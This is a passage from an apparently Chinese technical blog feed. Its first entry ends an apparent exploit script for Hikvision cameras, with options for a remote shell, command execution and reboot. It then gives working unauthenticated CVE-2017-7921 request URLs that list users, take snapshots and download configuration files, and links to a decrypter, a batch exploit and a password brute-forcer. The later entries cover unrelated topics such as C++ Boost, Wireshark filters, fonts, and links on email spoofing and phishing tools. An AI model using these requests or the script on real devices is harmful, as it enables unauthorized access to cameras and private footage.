class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Reboot if vulnerable'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--shell'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Launch SSH shell'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--cmd'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'execute cmd (i.e: "ls -l")'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--cmd_blind'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'execute blind cmd (i.e: "reboot")'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span>        <span class="token string">'--noverify'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Do not verify if vulnerable'</span>    <span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span>        <span class="token string">'--proto'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'http'</span><span class="token punctuation">,</span> <span class="token string">'https'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'http'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Protocol used'</span>    <span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    remote <span class="token operator">=</span> Http<span class="token punctuation">(</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">,</span> args<span class="token punctuation">.</span>rport<span class="token punctuation">,</span> args<span class="token punctuation">.</span>proto<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>shell<span class="token punctuation">:</span>            shell<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">:</span>            cmd<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">:</span>            cmd_blind<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>check<span class="token punctuation">:</span>            check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>reboot<span class="token punctuation">:</span>            check_reboot<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cve-2017-7921">CVE-2017-7921</h2><h3 id="漏洞概述-1">漏洞概述</h3><p>可以通过 Web 界面，无需授权，下载配置文件和获取监控图像。</p><h3 id="poc-1">PoC</h3><pre class="line-numbers language-none"><code class="language-none">检索用户与用户列表http://your-ip/Security/users?auth=YWRtaW46MTEK获取监控快照http://your-ip/onvif-http/snapshot?auth=YWRtaW46MTEK下载摄像头配置文件http://your-ip/System/configurationFile?auth=YWRtaW46MTEK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>海康威视的配置文件为 AES 加密，但是可以破解。</p><blockquote><p>https://github.com/WormChickenWizard/hikvision-decrypter</p></blockquote><p>批量 Exp: https://github.com/JrDw0/CVE-2017-7921-EXP</p><h2 id="弱口令爆破">弱口令爆破</h2><p>海康威视对 IP 有登录限制。</p><blockquote><p>https://github.com/duchengyao/hkdvr_login/tree/master</p></blockquote><h2 id="reference">Reference</h2><ul><li>https://www.hyluz.cn/post/54480.html</li><li>https://www.freebuf.com/vuls/278336.html</li><li>https://blog.csdn.net/weixin_44268918/article/details/128577850</li><li>https://blog.csdn.net/qq_46527139/article/details/111565277</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 实现高精度浮点运算</title>
      <link href="/2023/04/24/c-shi-xian-gao-jing-du-fu-dian-yun-suan/"/>
      <url>/2023/04/24/c-shi-xian-gao-jing-du-fu-dian-yun-suan/</url>
      
        <content type="html"><![CDATA[<h1 id="c-实现高精度浮点运算">C++ 实现高精度浮点运算</h1><p>（注意：本文已经默认您了解了 IEEE-754 标准！）</p><p>Boost 是一个开源的 C++ 库集合，它提供了许多高效的算法和工具，用于解决C++ 中的常见问题。其中，Boost.Multiprecision库是一个用于精度计算的工具库，可以用于高精度浮点数、整数和有理数计算。</p><p>在 C++ 中，浮点数默认是双精度类型，即 <code>double</code>类型，其精度有限。当需要进行高精度浮点数运算时，Boost.Multiprecision库提供了一些实现高精度计算的数据类型，比如<code>cpp_dec_float</code>。</p><p><code>cpp_dec_float</code> 是一个基于 Boost.Multiprecision库实现的高精度浮点数类型，它可以支持任意精度的小数点数值。由于它可以处理更大的数值范围和更高的精度要求，因此在一些科学计算、金融计算和密码学等领域中应用非常广泛。</p><p>使用 Boost.Multiprecision库进行高精度浮点数计算非常简单，只需在代码中引入相应的头文件，并使用<code>cpp_dec_float</code>类型代替原本的浮点数类型即可。在进行运算时，可以使用 Boost库提供的各种数学函数，以及操作符重载功能，方便地进行高精度浮点数运算。</p><h2 id="安装">安装</h2><h3 id="windows">Windows</h3><p>下载 Boost Release，将带版本号的文件夹解压至工作目录。</p><p>在 <code>CMakeLists.txt</code> 中加入<code>include_directories(boost_1_82_0)</code>.</p><p>就可以 include <code>boost</code> 下的头文件了，注意以<code>.hpp</code> 结尾。</p><h2 id="代码示例">代码示例</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;boost/math/special_functions/gamma.hpp&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;boost/multiprecision/cpp_bin_float.hpp&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> <span class="token keyword">namespace</span> boost<span class="token double-colon punctuation">::</span>multiprecision<span class="token punctuation">;</span>    <span class="token comment">// Operations at fixed precision and full numeric_limits support:</span>    cpp_bin_float_100 b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>numeric_limits<span class="token operator">&lt;</span>cpp_bin_float_100<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>digits <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>numeric_limits<span class="token operator">&lt;</span>cpp_bin_float_100<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>digits10 <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// We can use any C++ std lib function, lets print all the digits as well:</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span><span class="token function">setprecision</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>numeric_limits<span class="token operator">&lt;</span>cpp_bin_float_100<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>max_digits10<span class="token punctuation">)</span>              <span class="token operator">&lt;&lt;</span> <span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token comment">// print log(2)</span>    <span class="token comment">// We can also use any function from Boost.Math:</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> boost<span class="token double-colon punctuation">::</span>math<span class="token double-colon punctuation">::</span><span class="token function">tgamma</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// These even work when the argument is an expression template:</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> boost<span class="token double-colon punctuation">::</span>math<span class="token double-colon punctuation">::</span><span class="token function">tgamma</span><span class="token punctuation">(</span>b <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token comment">// And since we have an extended exponent range we can generate some really large</span>    <span class="token comment">// numbers here (4.0238726007709377354370243e+2564):</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> boost<span class="token double-colon punctuation">::</span>math<span class="token double-colon punctuation">::</span><span class="token function">tgamma</span><span class="token punctuation">(</span><span class="token function">cpp_bin_float_100</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用 <code>std::setprecision</code> 设置小数位数，位数为<code>std::numeric_limits&lt;cpp_bin_float_100&gt;::max_digits10</code>.防止结果在输出时被截断。</p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WOFF Web 字体二三事</title>
      <link href="/2023/04/15/woff-web-zi-ti-er-san-shi/"/>
      <url>/2023/04/15/woff-web-zi-ti-er-san-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="web-open-font-format">Web Open Font Format</h1><p>Web开放字体格式（Web Open FontFormat，简称WOFF）是一种网页所采用的字体格式标准。此字体格式发展于2009年，由万维网联盟的Web字体工作小组标准化，现在已经是推荐标准。此字体格式不但能够有效利用压缩来减少文件大小，并且不包含加密也不受DRM（数字著作权管理）限制。</p><p>在2010年4月8日，Mozilla基金会、Opera软件公司和微软提交WOFF之后，万维网联盟发表评论指，希望WOFF不久能成为所有浏览器都支持的、“单一、可互操作的（字体）格式”。2010年7月27日，万维网联盟将WOFF作为工作草案发布。2018年3月发布2.0版。</p><p>WOFF 多以网页资源，来补充客户端没有的字体。同时无需使用 JS实现字体加载。</p><h2 id="格式转换">格式转换</h2><ul><li>https://github.com/hanikesn/woff2otf</li><li>https://github.com/bashi/kombu</li><li>https://github.com/tbjgolden/woff-tools</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark BPF 捕获过滤器</title>
      <link href="/2023/04/15/wireshark-bpf-bu-huo-guo-lu-qi/"/>
      <url>/2023/04/15/wireshark-bpf-bu-huo-guo-lu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="wireshark-bpf-捕获过滤器">Wireshark BPF 捕获过滤器</h1><p>Wireshark 中，如果要过滤出所有的 POST 或者是 GET请求，我们可以用显示过滤器里的 <code>method</code>过滤。但是如果流量过大的话，涌入的数据包会填满缓冲区，过滤也需要消耗大量的CPU 资源。</p><h2 id="capture-filter">Capture Filter</h2><p>Capture filter is not a display filter</p><p>Capture filters (like <code>tcp port 80</code>) are not to beconfused with display filters (like <code>tcp.port == 80</code>). Theformer are much more limited and are used to reduce the size of a rawpacket capture. The latter are used to hide some packets from the packetlist.</p><p>Capture filters are set before starting a packet capture and cannotbe modified during the capture. Display filters on the other hand do nothave this limitation and you can change them on the fly.</p><blockquote><p>https://wiki.wireshark.org/CaptureFilters</p></blockquote><p>捕获过滤器可以在从网卡接收数据的阶段就进行过滤，大大优化抓包性能。</p><p>但是需要我们生成一个 BPF格式的过滤规则，主要是基于二进制与偏移的。</p><h2 id="生成器">生成器</h2><blockquote><p>https://www.wireshark.org/tools/string-cf.html</p><p>https://www.wireshark.org/docs/wsug_html_chunked/ChCapCaptureFilterSection.html</p></blockquote><p>这里为了性能和批量生成，使用 C++ 重构了代码。</p><blockquote><p>https://github.com/sfc9982/wireshark-bpf-capfilter</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> <span class="token function">stringToBpf</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string str<span class="token punctuation">,</span> <span class="token keyword">int</span> offset<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> std<span class="token double-colon punctuation">::</span>string <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">&gt;</span> bytes   <span class="token operator">=</span> <span class="token function">utf8Convert</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string                snippet <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>                        slicelen<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string                hexbytes<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string                conj <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string                offstr<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            slicelen <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            slicelen <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            slicelen <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">auto</span> slicebytes <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> slicelen<span class="token punctuation">)</span><span class="token punctuation">;</span>        bytes<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> slicelen<span class="token punctuation">)</span><span class="token punctuation">;</span>        hexbytes <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i<span class="token operator">:</span> slicebytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            hexbytes <span class="token operator">+=</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token punctuation">{</span>            offstr <span class="token operator">=</span> <span class="token string">" + "</span> <span class="token operator">+</span> std<span class="token double-colon punctuation">::</span><span class="token function">to_string</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            offstr <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        snippet <span class="token operator">+=</span> conj <span class="token operator">+</span> <span class="token string">"tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2)"</span> <span class="token operator">+</span> offstr <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> std<span class="token double-colon punctuation">::</span><span class="token function">to_string</span><span class="token punctuation">(</span>slicelen<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"] = 0x"</span> <span class="token operator">+</span> hexbytes<span class="token punctuation">;</span>        conj <span class="token operator">=</span> <span class="token string">" &amp;&amp; "</span><span class="token punctuation">;</span>        offset <span class="token operator">+=</span> slicelen<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> snippet<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="todo">TODO</h3><ul class="task-list"><li><label><input type="checkbox">支持 UTF-8 字符</label></li><li><label><input type="checkbox" checked="">交互模式</label></li></ul><h2 id="also-see">Also see</h2><ul><li>https://www.middlewareinventory.com/blog/tcpdump-capture-http-get-post-requests-apache-weblogic-websphere/</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 平台安装 H.265 视频扩展</title>
      <link href="/2023/04/14/windows-ping-tai-an-zhuang-h-265-shi-pin-kuo-zhan/"/>
      <url>/2023/04/14/windows-ping-tai-an-zhuang-h-265-shi-pin-kuo-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-平台安装-h.265-视频扩展">Windows 平台安装 H.265视频扩展</h1><p><img src="https://googles.plus/images/loading.gif" data-original="https://cccitu-img.huashengls.com/wp-content/uploads/1678559583809.png?imageMogr2/format/webp/quality/90"></p><p>访问 https://store.rg-adguard.net/ 选择Productld输入9n4wgh0z6vhq搜索，在搜索结果选择适合自己系统的版本下载，双击安装（下载链接为微软官方）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机延迟比较</title>
      <link href="/2023/04/14/ji-suan-ji-yan-chi-bi-jiao/"/>
      <url>/2023/04/14/ji-suan-ji-yan-chi-bi-jiao/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">Latency Comparison Numbers (~2012)----------------------------------L1 cache reference                           0.5 nsBranch mispredict                            5   nsL2 cache reference                           7   ns                      14x L1 cacheMutex lock/unlock                           25   nsMain memory reference                      100   ns                      20x L2 cache, 200x L1 cacheCompress 1K bytes with Zippy             3,000   ns        3 usSend 1K bytes over 1 Gbps network       10,000   ns       10 usRead 4K randomly from SSD*             150,000   ns      150 us          ~1GB/sec SSDRead 1 MB sequentially from memory     250,000   ns      250 usRound trip within same datacenter      500,000   ns      500 usRead 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memoryDisk seek                           10,000,000   ns   10,000 us   10 ms  20x datacenter roundtripRead 1 MB sequentially from disk    20,000,000   ns   20,000 us   20 ms  80x memory, 20X SSDSend packet CA-&gt;Netherlands-&gt;CA    150,000,000   ns  150,000 us  150 msNotes-----1 ns = 10^-9 seconds1 us = 10^-6 seconds = 1,000 ns1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>https://gist.github.com/jboner/2841832</p><p>https://computers-are-fast.github.io/</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SMTP 发信人伪造攻击</title>
      <link href="/2023/04/14/smtp-fa-xin-ren-wei-zao-gong-ji/"/>
      <url>/2023/04/14/smtp-fa-xin-ren-wei-zao-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="smtp-发信人伪造攻击">SMTP 发信人伪造攻击</h1><h2 id="guides">Guides</h2><ul><li>https://payloads.online/archivers/2019-05-09/1/</li><li>https://datacon.qianxin.com/blog/archives/277</li><li>https://www.swtjc.edu/documents/it/Email-Security-Best-Practices.pdf</li><li>https://www.t00ls.com/articles-65071.html</li></ul><h2 id="concepts">Concepts</h2><ul><li><p>Weak Links in Authentication Chains: A Large-scale Analysis ofEmail Sender Spoofing Attacks</p><ul><li>https://shenkaiwen.com/zh/</li><li>https://www.usenix.org/conference/usenixsecurity21/presentation/shen-kaiwen</li><li>https://twitter.com/drivertomtt/status/1374260903240036354?s=20</li><li>https://www.usenix.org/system/files/sec21_slides_shen_kaiwen_rev.pdf</li><li>https://shenkaiwen.com/files/papers/A_Large_scale_Analysis_of_Email_Spoofing_Attacks_USENIX_2021.pdf</li><li>https://shenkaiwen.com/files/papers/A_Large_scale_Analysis_of_Email_Sender_Spoo%ef%ac%81ng_Attacks_kaiwenshen.pdf</li><li>https://www.usenix.org/system/files/sec21-shen-kaiwen.pdf</li></ul><p>with some punycode</p></li></ul><h2 id="tools">Tools</h2><h3 id="espoofing">ESpoofing</h3><p>ESpoofing is a fuzzing tool for email sender spoofing attack. Thisfuzzing tool can generate a number of test samples based on the ABNFgrammar for authentication-related headers. Besides, we also provide anevaluation module to help email administrators to evaluate and increasetheir security.</p><p>https://github.com/mo-xiaoxi/ESpoofing</p><h3 id="gophish">GoPhish</h3><p>Gophish is an open-source phishing toolkit designed for businessesand penetration testers. It provides the ability to quickly and easilysetup and execute phishing engagements and security awarenesstraining.</p><p>https://github.com/gophish/gophish</p><h3 id="learn-dmarc">Learn DMARC</h3><p>Visualizing the communication between email servers will help youunderstand what SPF, DKIM, and DMARC do and how these mechanismswork.</p><p>https://www.learndmarc.com/</p><h2 id="practice">Practice</h2><h3 id="paypal-bypass">Paypal Bypass</h3><p>https://security.stackexchange.com/questions/257417/how-did-this-paypal-spoof-email-pass-spf-dkim-and-dmarc</p><h3 id="authenticity-101">Authenticity 101</h3><p>https://www.alexblackie.com/articles/email-authenticity-dkim-spf-dmarc/</p><h3 id="how-dmrac-works">How DMRAC Works</h3><p>https://simonandrews.ca/articles/how-to-set-up-spf-dkim-dmarc</p><h3 id="spam-filters">SPAM Filters</h3><p>https://deliciousbrains.com/how-spam-filters-works/?__s=b7opgxc3bpupssi4tgau</p><h2 id="also-see">Also see</h2><ul><li><a href="https://anchorety.github.io/2020/10/18/%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%91%E4%BB%B6%E4%BA%BA%E4%BC%AA%E9%80%A0/">邮件安全之发件人伪造</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Cybersecurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 网卡名称更改</title>
      <link href="/2023/04/14/linux-wang-qia-ming-cheng-geng-gai/"/>
      <url>/2023/04/14/linux-wang-qia-ming-cheng-geng-gai/</url>
      
